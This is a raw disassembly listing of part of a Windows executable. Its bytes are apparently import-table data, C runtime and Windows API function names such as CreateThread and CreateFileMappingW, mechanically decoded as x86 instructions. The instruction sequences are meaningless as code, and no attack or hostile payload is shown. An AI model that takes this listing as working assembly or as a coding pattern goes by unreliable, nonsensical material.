  41d73a:	add    DWORD PTR [eax],eax
  41d73c:	mov    al,ds:0xb60001e1
  41d741:	loope  0x41d744
  41d743:	add    dl,al
  41d745:	loope  0x41d748
  41d747:	add    dh,dl
  41d749:	loope  0x41d74c
  41d74b:	add    BYTE PTR [eax],al
  41d74d:	add    BYTE PTR [eax],al
  41d74f:	add    ah,dh
  41d751:	loope  0x41d754
  41d753:	add    BYTE PTR [edx+eiz*8],al
  41d756:	add    DWORD PTR [eax],eax
  41d758:	adc    al,0xe2
  41d75a:	add    DWORD PTR [eax],eax
  41d75c:	and    ah,dl
  41d75e:	add    DWORD PTR [eax],eax
  41d760:	xor    dl,ah
  41d762:	add    DWORD PTR [eax],eax
  41d764:	ds loop 0x41d768
  41d767:	add    BYTE PTR [edx-0x1e],dl
  41d76a:	add    DWORD PTR [eax],eax
  41d76c:	pusha  
  41d76d:	loop   0x41d770
  41d76f:	add    BYTE PTR [edx-0x1e],bh
  41d772:	add    DWORD PTR [eax],eax
  41d774:	xchg   dl,ah
  41d776:	add    DWORD PTR [eax],eax
  41d778:	cwde   
  41d779:	loop   0x41d77c
  41d77b:	add    BYTE PTR [edx+eiz*8-0x1d47ffff],ah
  41d782:	add    DWORD PTR [eax],eax
  41d784:	int3   
  41d785:	loop   0x41d788
  41d787:	add    dh,dl
  41d789:	loop   0x41d78c
  41d78b:	add    al,ah
  41d78d:	loop   0x41d790
  41d78f:	add    dl,bh
  41d791:	loop   0x41d794
  41d793:	add    BYTE PTR [edx],cl
  41d795:	jecxz  0x41d798
  41d797:	add    BYTE PTR [edx],bl
  41d799:	jecxz  0x41d79c
  41d79b:	add    BYTE PTR [ebx+eiz*8],ah
  41d79e:	add    DWORD PTR [eax],eax
  41d7a0:	xor    al,0xe3
  41d7a2:	add    DWORD PTR [eax],eax
  41d7a4:	inc    eax
  41d7a5:	jecxz  0x41d7a8
  41d7a7:	add    BYTE PTR [esi-0x1d],cl
  41d7aa:	add    DWORD PTR [eax],eax
  41d7ac:	fs jecxz 0x41d7b0
  41d7af:	add    BYTE PTR [esi-0x1d],dh
  41d7b2:	add    DWORD PTR [eax],eax
  41d7b4:	mov    fs,ebx
  41d7b6:	add    DWORD PTR [eax],eax
  41d7b8:	mov    ds:0xb00001e3,al
  41d7bd:	jecxz  0x41d7c0
  41d7bf:	add    dl,al
  41d7c1:	jecxz  0x41d7c4
  41d7c3:	add    dh,cl
  41d7c5:	jecxz  0x41d7c8
  41d7c7:	add    dh,bl
  41d7c9:	jecxz  0x41d7cc
  41d7cb:	add    ah,ch
  41d7cd:	jecxz  0x41d7d0
  41d7cf:	add    BYTE PTR [eax],al
  41d7d1:	in     al,0x1
  41d7d3:	add    BYTE PTR [esi],cl
  41d7d5:	in     al,0x1
  41d7d7:	add    BYTE PTR [edx],ch
  41d7d9:	in     al,0x1
  41d7db:	add    BYTE PTR [esp+eiz*8],bh
  41d7de:	add    DWORD PTR [eax],eax
  41d7e0:	dec    esp
  41d7e1:	in     al,0x1
  41d7e3:	add    BYTE PTR [esi-0x1c],bl
  41d7e6:	add    DWORD PTR [eax],eax
  41d7e8:	push   0xffffffe4
  41d7ea:	add    DWORD PTR [eax],eax
  41d7ec:	jl     0x41d7d2
  41d7ee:	add    DWORD PTR [eax],eax
  41d7f0:	mov    ah,ah
  41d7f2:	add    DWORD PTR [eax],eax
  41d7f4:	cwde   
  41d7f5:	in     al,0x1
  41d7f7:	add    BYTE PTR [esi-0x3ffffe1c],ch
  41d7fd:	in     al,0x1
  41d7ff:	add    al,dl
  41d801:	in     al,0x1
  41d803:	add    dl,ah
  41d805:	in     al,0x1
  41d807:	add    al,dh
  41d809:	in     al,0x1
  41d80b:	add    BYTE PTR [eax],cl
  41d80d:	in     eax,0x1
  41d80f:	add    BYTE PTR [eiz*8-0x1ad5ffff],bl
  41d816:	add    DWORD PTR [eax],eax
  41d818:	ds in  eax,0x1
  41d81b:	add    BYTE PTR [edx-0x1b],cl
  41d81e:	add    DWORD PTR [eax],eax
  41d820:	pop    edx
  41d821:	in     eax,0x1
  41d823:	add    BYTE PTR [esi-0x1b],ch
  41d826:	add    DWORD PTR [eax],eax
  41d828:	jle    0x41d80f
  41d82a:	add    DWORD PTR [eax],eax
  41d82c:	nop
  41d82d:	in     eax,0x1
  41d82f:	add    BYTE PTR [ebp+eiz*8-0x1a55ffff],bl
  41d836:	add    DWORD PTR [eax],eax
  41d838:	mov    eax,0xca0001e5
  41d83d:	in     eax,0x1
  41d83f:	add    dl,bl
  41d841:	in     eax,0x1
  41d843:	add    dh,ah
  41d845:	in     eax,0x1
  41d847:	add    ah,bh
  41d849:	in     eax,0x1
  41d84b:	add    BYTE PTR [esi],cl
  41d84d:	out    0x1,al
  41d84f:	add    BYTE PTR [eax],ch
  41d851:	out    0x1,al
  41d853:	add    BYTE PTR [edx],bh
  41d855:	out    0x1,al
  41d857:	add    BYTE PTR [esi+eiz*8+0x1],cl
  41d85b:	add    BYTE PTR [eax-0x1a],bl
  41d85e:	add    DWORD PTR [eax],eax
  41d860:	push   0x7a0001e6
  41d865:	out    0x1,al
  41d867:	add    BYTE PTR [esi-0x67fffe1a],al
  41d86d:	out    0x1,al
  41d86f:	add    BYTE PTR [edx-0x35fffe1a],dh
  41d875:	out    0x1,al
  41d877:	add    ah,bl
  41d879:	out    0x1,al
  41d87b:	add    dl,ch
  41d87d:	out    0x1,al
  41d87f:	add    al,bh
  41d881:	out    0x1,al
  41d883:	add    BYTE PTR [esi],cl
  41d885:	out    0x1,eax
  41d887:	add    BYTE PTR [esi],bl
  41d889:	out    0x1,eax
  41d88b:	add    BYTE PTR [edx],ch
  41d88d:	out    0x1,eax
  41d88f:	add    BYTE PTR [edx],bh
  41d891:	out    0x1,eax
  41d893:	add    BYTE PTR [edx-0x19],cl
  41d896:	add    DWORD PTR [eax],eax
  41d898:	pop    esp
  41d899:	out    0x1,eax
  41d89b:	add    BYTE PTR [eax-0x19],ch
  41d89e:	add    DWORD PTR [eax],eax
  41d8a0:	jbe    0x41d889
  41d8a2:	add    DWORD PTR [eax],eax
  41d8a4:	xchg   bh,ah
  41d8a6:	add    DWORD PTR [eax],eax
  41d8a8:	cwde   
  41d8a9:	out    0x1,eax
  41d8ab:	add    BYTE PTR [eax-0x45fffe19],ch
  41d8b1:	out    0x1,eax
  41d8b3:	add    al,dl
  41d8b5:	out    0x1,eax
  41d8b7:	add    dh,ah
  41d8b9:	out    0x1,eax
  41d8bb:	add    dh,dh
  41d8bd:	out    0x1,eax
  41d8bf:	add    BYTE PTR [edx],al
  41d8c1:	call   0xe859d8c7
  41d8c6:	add    DWORD PTR [eax],eax
  41d8c8:	and    al,0xe8
  41d8ca:	add    DWORD PTR [eax],eax
  41d8cc:	xor    al,0xe8
  41d8ce:	add    DWORD PTR [eax],eax
  41d8d0:	dec    eax
  41d8d1:	call   0xe897d8d7
  41d8d6:	add    DWORD PTR [eax],eax
  41d8d8:	callw  0xd8dd
  41d8dc:	jp     0x41d8c6
  41d8de:	add    DWORD PTR [eax],eax
  41d8e0:	xchg   al,ch
  41d8e2:	add    DWORD PTR [eax],eax
  41d8e4:	xchg   esi,eax
  41d8e5:	call   0xe8e3d8eb
  41d8ea:	add    DWORD PTR [eax],eax
  41d8ec:	mov    dl,0xe8
  41d8ee:	add    DWORD PTR [eax],eax
  41d8f0:	(bad)  
  41d8f1:	call   0xe913d8f7
  41d8f6:	add    DWORD PTR [eax],eax
  41d8f8:	in     al,0xe8
  41d8fa:	add    DWORD PTR [eax],eax
  41d8fc:	lock call 0xe93fd903
  41d902:	add    DWORD PTR [eax],eax
  41d904:	or     al,0xe9
  41d906:	add    DWORD PTR [eax],eax
  41d908:	sbb    ch,cl
  41d90a:	add    DWORD PTR [eax],eax
  41d90c:	add    BYTE PTR [eax],al
  41d90e:	add    BYTE PTR [eax],al
  41d910:	or     al,0x2
  41d912:	add    BYTE PTR [eax+0x0],al
  41d918:	cmc    
  41d919:	add    BYTE PTR [edi+0x63],bl
  41d91c:	outs   dx,DWORD PTR ds:[esi]
  41d91d:	outs   dx,BYTE PTR ds:[esi]
  41d91e:	je     0x41d992
  41d920:	outs   dx,DWORD PTR ds:[esi]
  41d921:	ins    BYTE PTR es:[edi],dx
  41d922:	data16 jo 0x41d925
  41d925:	add    BYTE PTR [ebx],al
  41d927:	add    al,0x73
  41d929:	jns    0x41d99e
  41d92b:	je     0x41d992
  41d92d:	ins    DWORD PTR es:[edi],dx
  41d92e:	add    BYTE PTR [eax],al
  41d930:	fwait
  41d931:	add    ebp,DWORD PTR [ecx+0x73]
  41d934:	jo     0x41d9a8
  41d936:	imul   ebp,DWORD PTR [esi+0x74],0x61035a00
  41d93d:	je     0x41d9ae
  41d93f:	ins    BYTE PTR es:[edi],dx
  41d940:	add    BYTE PTR [eax],al
  41d942:	jmp    0x7363:0x72747303
  41d949:	jo     0x41d9b9
  41d94b:	add    BYTE PTR [edi+0x73626d03],dh
  41d951:	je     0x41d9c2
  41d953:	ja     0x41d9b8
  41d955:	jae    0x41d957
  41d957:	add    bh,ah
  41d959:	add    esi,DWORD PTR [ebx+0x74]
  41d95c:	jb     0x41d9c1
  41d95e:	outs   dx,DWORD PTR ds:[esi]
  41d95f:	ins    BYTE PTR es:[edi],dx
  41d960:	ins    BYTE PTR es:[edi],dx
  41d961:	add    ch,al
  41d963:	add    esi,DWORD PTR [eax+0x72]
  41d966:	imul   ebp,DWORD PTR [esi+0x74],0xb000066
  41d96d:	add    al,0x74
  41d96f:	outs   dx,DWORD PTR ds:[esi]
  41d970:	ja     0x41d9de
  41d972:	outs   dx,DWORD PTR ds:[esi]
  41d973:	ja     0x41d9da
  41d975:	jb     0x41d977
  41d977:	add    BYTE PTR [esi],al
  41d979:	add    al,0x74
  41d97b:	imul   ebp,DWORD PTR [ebp+0x65],0x36d0000
  41d982:	data16 addr16 gs je 0x41d9ea
  41d987:	add    BYTE PTR [ebx+0x735f5f00],dh
  41d98d:	gs je  0x41d9ef
  41d990:	popa   
  41d991:	jo     0x41da03
  41d993:	pop    edi
  41d994:	je     0x41da0f
  41d996:	jo     0x41d9fd
  41d998:	add    BYTE PTR [eax],al
  41d99a:	mov    al,ds:0x705f5f00
  41d99f:	pop    edi
  41d9a0:	pop    edi
  41d9a1:	ins    WORD PTR es:[edi],dx
  41d9a3:	outs   dx,DWORD PTR ds:[esi]
  41d9a4:	fs add BYTE PTR gs:[eax],al
  41d9a8:	xchg   esp,eax
  41d9a9:	add    ebp,DWORD PTR [ecx+0x73]
  41d9ac:	popa   
  41d9ad:	ins    BYTE PTR es:[edi],dx
  41d9ae:	outs   dx,BYTE PTR ds:[esi]
  41d9af:	jne    0x41da1e
  41d9b1:	add    dl,bh
  41d9b3:	add    esi,DWORD PTR [ebx+0x74]
  41d9b6:	jb     0x41da2c
  41d9b8:	outs   dx,DWORD PTR ds:[esi]
  41d9b9:	imul   eax,DWORD PTR [eax],0x0
  41d9bc:	sbb    al,0x4
  41d9be:	ja     0x41da23
  41d9c0:	jae    0x41da25
  41d9c2:	popa   
  41d9c3:	je     0x41d9c5
  41d9c5:	add    BYTE PTR [ecx+0x74626d03],bh
  41d9cb:	outs   dx,DWORD PTR ds:[esi]
  41d9cc:	ja     0x41da31
  41d9ce:	add    BYTE PTR [eax],al
  41d9d0:	fwait
  41d9d1:	add    BYTE PTR [edi+0x5f],bl
  41d9d4:	jo     0x41da35
  41d9d6:	pop    edi
  41d9d7:	arpl   WORD PTR [edi+0x6d],bp
  41d9da:	ins    DWORD PTR es:[edi],dx
  41d9db:	outs   dx,DWORD PTR ds:[esi]
  41d9dc:	fs add BYTE PTR gs:[eax],al
  41d9e0:	loope  0x41d9e5
  41d9e2:	jae    0x41da57
  41d9e4:	arpl   WORD PTR [ecx+0x6e],sp
  41d9e7:	data16 add BYTE PTR [eax],al
  41d9ea:	fild   DWORD PTR [eax]
  41d9ec:	pop    edi
  41d9ed:	popa   
  41d9ee:	ins    DWORD PTR es:[edi],dx
  41d9ef:	jae    0x41da58
  41d9f1:	pop    edi
  41d9f2:	gs js  0x41da5e
  41d9f5:	je     0x41d9f7
  41d9f7:	add    BYTE PTR [esi+0x6e695f01],al
  41d9fd:	imul   esi,DWORD PTR [esp+esi*2+0x65],0xc8006d72
  41da05:	add    esi,DWORD PTR [eax+0x75]
  41da08:	je     0x41da6d
  41da0a:	push   0xb1007261
  41da0f:	add    ebp,DWORD PTR [edi+ebp*2+0x63]
  41da13:	popa   
  41da14:	ins    BYTE PTR es:[edi],dx
  41da15:	je     0x41da80
  41da17:	ins    DWORD PTR es:[edi],dx
  41da18:	add    BYTE PTR gs:[ecx+0x3],ch
  41da1c:	data16 arpl WORD PTR [edi+ebp*2+0x73],bp
  41da21:	add    BYTE PTR gs:[eax],al
  41da24:	or     eax,0x676e7504
  41da29:	gs je  0x41da8f
  41da2c:	add    BYTE PTR [eax],al
  41da2e:	sub    DWORD PTR [edi+esi*2],eax
  41da31:	arpl   WORD PTR [ebx+0x6e],si
  41da34:	arpl   WORD PTR [eax+0x79],si
  41da37:	add    bh,cl
  41da39:	add    esi,DWORD PTR [edx+0x61]
  41da3c:	outs   dx,BYTE PTR ds:[esi]
  41da3d:	add    BYTE PTR fs:[eax],al
  41da40:	sahf   
  41da41:	add    DWORD PTR [edi+0x69],ebx
  41da44:	jae    0x41dab3
  41da46:	bound  esp,QWORD PTR [edx+0x6c]
  41da49:	gs popa 
  41da4b:	add    BYTE PTR fs:[eax],al
  41da4e:	add    DWORD PTR [ebx+esi*2],eax
  41da51:	ja     0x41dac6
  41da53:	arpl   WORD PTR [ecx+0x6e],sp
  41da56:	data16 add BYTE PTR [ebx+0x77736903],ch
  41da5d:	js     0x41dac3
  41da5f:	imul   esp,DWORD PTR [edi+0x69],0x4280074
  41da66:	ja     0x41dacb
  41da68:	jae    0x41dad8
  41da6a:	arpl   WORD PTR [ebp+0x70],bp
  41da6d:	add    BYTE PTR [esi+0x75736903],bl
  41da73:	jo     0x41dae5
  41da75:	gs jb  0x41da78
  41da78:	push   edx
  41da79:	add    BYTE PTR [edi+0x58],bl
  41da7c:	arpl   WORD PTR [eax+0x74],si
  41da7f:	inc    esi
  41da80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x1230072
  41da88:	pop    edi
  41da89:	gs js  0x41daf5
  41da8c:	je     0x41da8e
  41da8e:	sbb    BYTE PTR [esi+esi*2],al
  41da91:	jae    0x41db0a
  41da93:	jo     0x41db07
  41da95:	imul   ebp,DWORD PTR [esi+0x74],0xe80066
  41da9c:	pop    edi
  41da9d:	arpl   WORD PTR [ebp+0x78],sp
  41daa0:	imul   esi,DWORD PTR [eax+eax*1+0x0],0x7362035b
  41daa8:	gs popa 
  41daaa:	jb     0x41db0f
  41daac:	push   0x7303e800
  41dab1:	je     0x41db25
  41dab3:	arpl   WORD PTR [eax+0x79],si
  41dab6:	add    BYTE PTR [eax],al
  41dab8:	mov    ch,0x0
  41daba:	pop    edi
  41dabb:	pop    edi
  41dabc:	jae    0x41db23
  41dabe:	je     0x41db35
  41dac0:	jae    0x41db27
  41dac2:	jb     0x41db31
  41dac4:	popa   
  41dac5:	je     0x41db2f
  41dac7:	gs jb  0x41db3c
  41daca:	add    BYTE PTR [eax],al
  41dacc:	jb     0x41dace
  41dace:	pop    edi
  41dacf:	pop    edi
  41dad0:	addr16 gs je 0x41db41
  41dad4:	popa   
  41dad5:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  41dadc:	pop    edi
  41dadd:	add    esp,DWORD PTR [ebx+0x6c]
  41dae0:	gs popa 
  41dae2:	jb     0x41db49
  41dae4:	jb     0x41db58
  41dae6:	add    BYTE PTR [eax],al
  41dae8:	and    DWORD PTR [edi+esi*2],eax
  41daeb:	arpl   WORD PTR [ebx+0x63],si
  41daee:	jo     0x41db69
  41daf0:	add    BYTE PTR [eax],al
  41daf2:	std    
  41daf3:	add    esi,DWORD PTR [ebx+0x74]
  41daf6:	jb     0x41db6c
  41daf8:	outs   dx,DWORD PTR ds:[esi]
  41daf9:	jne    0x41db67
  41dafb:	add    bl,al
  41dafd:	add    esi,DWORD PTR [eax+0x65]
  41db00:	jb     0x41db74
  41db02:	outs   dx,DWORD PTR ds:[esi]
  41db03:	jb     0x41db05
  41db05:	add    BYTE PTR [ebp+0x53],cl
  41db08:	push   esi
  41db09:	inc    ebx
  41db0a:	push   edx
  41db0b:	push   esp
  41db0c:	cs fs ins BYTE PTR es:[edi],dx
  41db0f:	ins    BYTE PTR es:[edi],dx
  41db10:	add    BYTE PTR [eax],al
  41db12:	inc    ecx
  41db13:	add    al,0x53
  41db15:	gs je  0x41db6d
  41db18:	outs   dx,BYTE PTR ds:[esi]
  41db19:	push   0x6c646e61
  41db1e:	gs fs inc ebp
  41db21:	js     0x41db86
  41db23:	gs jo  0x41db9a
  41db26:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  41db2d:	gs jb  0x41db30
  41db30:	jmp    0x6946:0x74654701
  41db37:	ins    BYTE PTR es:[edi],dx
  41db38:	gs inc ecx
  41db3a:	je     0x41dbb0
  41db3c:	jb     0x41dba7
  41db3e:	bound  esi,QWORD PTR [ebp+0x74]
  41db41:	gs jae 0x41db89
  41db44:	js     0x41db87
  41db46:	add    BYTE PTR [eax],al
  41db48:	pop    esp
  41db49:	add    DWORD PTR [esi+0x69],eax
  41db4c:	outs   dx,BYTE PTR ds:[esi]
  41db4d:	fs inc esi
  41db4f:	imul   esi,DWORD PTR [edx+0x73],0x61684374
  41db56:	outs   dx,BYTE PTR ds:[esi]
  41db57:	addr16 gs dec esi
  41db5a:	outs   dx,DWORD PTR ds:[esi]
  41db5b:	je     0x41dbc6
  41db5d:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41db63:	outs   dx,DWORD PTR ds:[esi]
  41db64:	outs   dx,BYTE PTR ds:[esi]
  41db65:	push   edi
  41db66:	add    BYTE PTR [eax],al
  41db68:	mov    ds:0x6c614300,al
  41db6d:	ins    BYTE PTR es:[edi],dx
  41db6e:	dec    esi
  41db6f:	popa   
  41db70:	ins    DWORD PTR es:[edi],dx
  41db71:	gs fs push eax
  41db74:	imul   esi,DWORD PTR [eax+0x65],0xdb000057
  41db7b:	add    cl,BYTE PTR [ecx+0x73]
  41db7e:	push   esi
  41db7f:	popa   
  41db80:	ins    BYTE PTR es:[edi],dx
  41db81:	imul   esp,DWORD PTR [esp+ecx*2+0x6f],0x656c6163
  41db89:	add    BYTE PTR [ebp+0x1],ah
  41db8c:	inc    esi
  41db8d:	imul   ebp,DWORD PTR [esi+0x64],0x7478654e
  41db94:	inc    ebx
  41db95:	push   0x65676e61
  41db9a:	dec    esi
  41db9b:	outs   dx,DWORD PTR ds:[esi]
  41db9c:	je     0x41dc07
  41db9e:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41dba4:	outs   dx,DWORD PTR ds:[esi]
  41dba5:	outs   dx,BYTE PTR ds:[esi]
  41dba6:	add    BYTE PTR [eax],al
  41dba8:	cmp    BYTE PTR [ebx+edx*2],al
  41dbab:	gs je  0x41dc02
  41dbae:	push   0x64616572
  41dbb3:	inc    ebp
  41dbb4:	js     0x41dc1b
  41dbb6:	arpl   WORD PTR [ebp+0x74],si
  41dbb9:	imul   ebp,DWORD PTR [edi+0x6e],0x74617453
  41dbc0:	add    BYTE PTR gs:[esi],bl
  41dbc3:	add    al,BYTE PTR [edi+0x65]
  41dbc6:	je     0x41dc18
  41dbc8:	jb     0x41dc33
  41dbca:	outs   dx,DWORD PTR ds:[esi]
  41dbcb:	jb     0x41dc36
  41dbcd:	je     0x41dc48
  41dbcf:	inc    ebx
  41dbd0:	ins    BYTE PTR es:[edi],dx
  41dbd1:	popa   
  41dbd2:	jae    0x41dc47
  41dbd4:	add    BYTE PTR [eax],al
  41dbd6:	add    DWORD PTR [bp+0x69],eax
  41dbda:	outs   dx,BYTE PTR ds:[esi]
  41dbdb:	fs dec esi
  41dbdd:	gs js  0x41dc54
  41dbe0:	inc    esi
  41dbe1:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x57048d00
  41dbe9:	popa   
  41dbea:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6c754d72
  41dbf2:	je     0x41dc5d
  41dbf4:	jo     0x41dc62
  41dbf6:	gs dec edi
  41dbf8:	bound  ebp,QWORD PTR [edx+0x65]
  41dbfb:	arpl   WORD PTR [ebx+esi*2+0x45],si
  41dbff:	js     0x41dc01
  41dc01:	add    BYTE PTR [edi],ah
  41dc03:	add    al,0x53
  41dc05:	gs je  0x41dc56
  41dc08:	popa   
  41dc09:	ins    DWORD PTR es:[edi],dx
  41dc0a:	gs fs push eax
  41dc0d:	imul   esi,DWORD PTR [eax+0x65],0x646e6148
  41dc14:	ins    BYTE PTR es:[edi],dx
  41dc15:	gs push ebx
  41dc17:	je     0x41dc7a
  41dc19:	je     0x41dc80
  41dc1b:	add    bl,bh
  41dc1d:	add    DWORD PTR [edi+0x65],eax
  41dc20:	je     0x41dc6e
  41dc22:	popa   
  41dc23:	jae    0x41dc99
  41dc25:	inc    ebp
  41dc26:	jb     0x41dc9a
  41dc28:	outs   dx,DWORD PTR ds:[esi]
  41dc29:	jb     0x41dc2b
  41dc2b:	add    BYTE PTR [eax+0x6f6c4702],dl
  41dc31:	bound  esp,QWORD PTR [ecx+0x6c]
  41dc34:	inc    esi
  41dc35:	jb     0x41dc9c
  41dc37:	add    BYTE PTR gs:[eax],al
  41dc3a:	or     al,BYTE PTR [edx]
  41dc3c:	inc    edi
  41dc3d:	gs je  0x41dc8d
  41dc40:	outs   dx,DWORD PTR ds:[esi]
  41dc41:	fs jne 0x41dcb0
  41dc44:	gs dec eax
  41dc46:	popa   
  41dc47:	outs   dx,BYTE PTR ds:[esi]
  41dc48:	fs ins BYTE PTR es:[edi],dx
  41dc4a:	gs inc ecx
  41dc4c:	add    BYTE PTR [eax],al
  41dc4e:	js     0x41dc53
  41dc50:	push   edx
  41dc51:	gs popa 
  41dc53:	fs inc esi
  41dc55:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47019000
  41dc5d:	gs je  0x41dca3
  41dc60:	push   eax
  41dc61:	dec    ecx
  41dc62:	outs   dx,BYTE PTR ds:[esi]
  41dc63:	outs   dx,WORD PTR ds:[esi]
  41dc65:	add    BYTE PTR ds:0x74655304,ah
  41dc6b:	dec    ebp
  41dc6c:	popa   
  41dc6d:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41dc75:	outs   dx,WORD PTR ds:[esi]
  41dc77:	add    dh,bh
  41dc79:	add    DWORD PTR [edi+0x65],eax
  41dc7c:	je     0x41dcca
  41dc7e:	outs   dx,DWORD PTR ds:[esi]
  41dc7f:	arpl   WORD PTR [ecx+0x6c],sp
  41dc82:	gs dec ecx
  41dc84:	outs   dx,BYTE PTR ds:[esi]
  41dc85:	outs   dx,WORD PTR ds:[esi]
  41dc87:	inc    ecx
  41dc88:	add    BYTE PTR [eax],al
  41dc8a:	push   es
  41dc8b:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  41dc8f:	fs dec esp
  41dc91:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  41dc98:	js     0x41dcdb
  41dc9a:	add    BYTE PTR [eax],al
  41dc9c:	outs   dx,DWORD PTR ds:[esi]
  41dc9d:	add    al,BYTE PTR [edi+0x65]
  41dca0:	je     0x41dcf6
  41dca2:	imul   ebp,DWORD PTR [ebp+0x65],0x6d726f46
  41dca9:	popa   
  41dcaa:	je     0x41dced
  41dcac:	add    BYTE PTR [eax],al
  41dcae:	inc    DWORD PTR [ecx]
  41dcb0:	inc    edi
  41dcb1:	gs je  0x41dd00
  41dcb4:	outs   dx,DWORD PTR ds:[esi]
  41dcb5:	arpl   WORD PTR [ecx+0x6c],sp
  41dcb8:	gs dec ecx
  41dcba:	outs   dx,BYTE PTR ds:[esi]
  41dcbb:	outs   dx,WORD PTR ds:[esi]
  41dcbd:	push   edi
  41dcbe:	add    BYTE PTR [eax],al
  41dcc0:	rol    BYTE PTR [esp+ebp*2],0x73
  41dcc4:	je     0x41dd38
  41dcc6:	arpl   WORD PTR [ecx+0x74],sp
  41dcc9:	push   edi
  41dcca:	add    BYTE PTR [eax],al
  41dccc:	repnz add DWORD PTR [edi+0x65],eax
  41dcd0:	je     0x41dd18
  41dcd2:	jne    0x41dd40
  41dcd4:	ins    BYTE PTR es:[edi],dx
  41dcd5:	push   eax
  41dcd6:	popa   
  41dcd7:	je     0x41dd41
  41dcd9:	dec    esi
  41dcda:	popa   
  41dcdb:	ins    DWORD PTR es:[edi],dx
  41dcdc:	gs inc ecx
  41dcde:	add    BYTE PTR [eax],al
  41dce0:	cmp    al,0x3
  41dce2:	dec    edi
  41dce3:	jo     0x41dd4a
  41dce5:	outs   dx,BYTE PTR ds:[esi]
  41dce6:	inc    esi
  41dce7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41dcef:	outs   dx,BYTE PTR ds:[esi]
  41dcf0:	addr16 push edi
  41dcf2:	add    BYTE PTR [eax],al
  41dcf4:	stc    
  41dcf5:	add    cl,BYTE PTR [ecx+0x73]
  41dcf8:	inc    edx
  41dcf9:	popa   
  41dcfa:	fs push ebx
  41dcfc:	je     0x41dd70
  41dcfe:	imul   ebp,DWORD PTR [esi+0x67],0x57727450
  41dd05:	add    dl,cl
  41dd07:	add    BYTE PTR [ebx+0x72],al
  41dd0a:	gs popa 
  41dd0c:	je     0x41dd73
  41dd0e:	inc    ebp
  41dd0f:	jbe    0x41dd76
  41dd11:	outs   dx,BYTE PTR ds:[esi]
  41dd12:	je     0x41dd55
  41dd14:	add    BYTE PTR [eax],al
  41dd16:	ins    DWORD PTR es:[edi],dx
  41dd17:	add    al,0x55
  41dd19:	outs   dx,BYTE PTR ds:[esi]
  41dd1a:	ins    BYTE PTR es:[edi],dx
  41dd1b:	outs   dx,DWORD PTR ds:[esi]
  41dd1c:	arpl   WORD PTR [ebx+0x46],bp
  41dd1f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x45011300
  41dd27:	outs   dx,BYTE PTR ds:[esi]
  41dd28:	je     0x41dd8f
  41dd2a:	jb     0x41dd6f
  41dd2c:	jb     0x41dd97
  41dd2e:	je     0x41dd99
  41dd30:	arpl   WORD PTR [ecx+0x6c],sp
  41dd33:	push   ebx
  41dd34:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41dd39:	outs   dx,BYTE PTR ds:[esi]
  41dd3a:	add    BYTE PTR [eax],al
  41dd3c:	pop    edi
  41dd3d:	add    al,0x54
  41dd3f:	ins    BYTE PTR es:[edi],dx
  41dd40:	jae    0x41dd89
  41dd42:	gs je  0x41dd9b
  41dd45:	popa   
  41dd46:	ins    BYTE PTR es:[edi],dx
  41dd47:	jne    0x41ddae
  41dd49:	add    BYTE PTR [ebx+0x61654802],ah
  41dd4f:	jo     0x41dd94
  41dd51:	jb     0x41ddb8
  41dd53:	popa   
  41dd54:	je     0x41ddbb
  41dd56:	add    BYTE PTR [eax],al
  41dd58:	dec    ebp
  41dd59:	add    al,0x53
  41dd5b:	ins    BYTE PTR es:[edi],dx
  41dd5c:	gs gs jo 0x41dd60
  41dd60:	jnp    0x41dd63
  41dd62:	inc    esi
  41dd63:	outs   dx,DWORD PTR ds:[esi]
  41dd64:	ins    BYTE PTR es:[edi],dx
  41dd65:	fs push ebx
  41dd67:	je     0x41dddb
  41dd69:	imul   ebp,DWORD PTR [esi+0x67],0x47a0057
  41dd70:	push   esi
  41dd71:	gs jb  0x41ddc7
  41dd74:	gs je  0x41ddba
  41dd77:	outs   dx,DWORD PTR ds:[esi]
  41dd78:	outs   dx,BYTE PTR ds:[esi]
  41dd79:	imul   esi,DWORD PTR fs:[ecx+ebp*2+0x6f],0x73614d6e
  41dd82:	imul   eax,DWORD PTR [eax],0xffffff94
  41dd85:	add    al,0x57
  41dd87:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  41dd8e:	in     eax,dx
  41dd8f:	add    BYTE PTR [ebx+0x72],al
  41dd92:	gs popa 
  41dd94:	je     0x41ddfb
  41dd96:	push   esp
  41dd97:	push   0x64616572
  41dd9c:	add    BYTE PTR [eax],al
  41dd9e:	rol    BYTE PTR [eax],cl
  41dda0:	inc    ebx
  41dda1:	jb     0x41de08
  41dda3:	popa   
  41dda4:	je     0x41de0b
  41dda6:	inc    esi
  41dda7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41ddaf:	outs   dx,BYTE PTR ds:[esi]
  41ddb0:	addr16 push edi
  41ddb2:	add    BYTE PTR [eax],al
  41ddb4:	mov    ah,0x0
  41ddb6:	inc    ebx
  41ddb7:	outs   dx,DWORD PTR ds:[esi]
  41ddb8:	ins    DWORD PTR es:[edi],dx
  41ddb9:	jo     0x41de1c
  41ddbb:	jb     0x41de22
  41ddbd:	push   ebx
  41ddbe:	je     0x41de32
  41ddc0:	imul   ebp,DWORD PTR [esi+0x67],0xfe000057
  41ddc7:	add    BYTE PTR [ebp+eiz*2+0x66],al
  41ddcb:	imul   ebp,DWORD PTR [esi+0x65],0x44736f44
  41ddd2:	gs jbe 0x41de3e
  41ddd5:	arpl   WORD PTR [ebp+0x57],sp
  41ddd8:	add    BYTE PTR [eax],al
  41ddda:	out    0x0,eax
  41dddc:	inc    ebx
  41dddd:	jb     0x41de44
  41dddf:	popa   
  41dde0:	je     0x41de47
  41dde2:	push   ebx
  41dde3:	gs ins DWORD PTR es:[edi],dx
  41dde5:	popa   
  41dde6:	jo     0x41de50
  41dde8:	outs   dx,DWORD PTR ds:[esi]
  41dde9:	jb     0x41de50
  41ddeb:	inc    ecx
